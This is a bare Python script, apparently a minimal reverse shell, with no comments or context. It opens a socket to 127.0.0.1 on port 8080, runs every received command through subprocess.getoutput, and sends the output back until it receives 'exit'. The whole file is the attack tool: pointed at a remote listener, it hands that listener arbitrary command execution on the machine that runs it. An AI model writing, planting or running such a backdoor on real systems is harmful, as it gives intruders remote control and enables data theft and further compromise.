import socket
import subprocess
import os

HOST = '127.0.0.1'
PORT = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))

while True:
    command = s.recv(1024).decode()
    
    if command.strip() == "exit":
        break
    
    output = subprocess.getoutput(command)
    s.send(output.encode())

s.close()
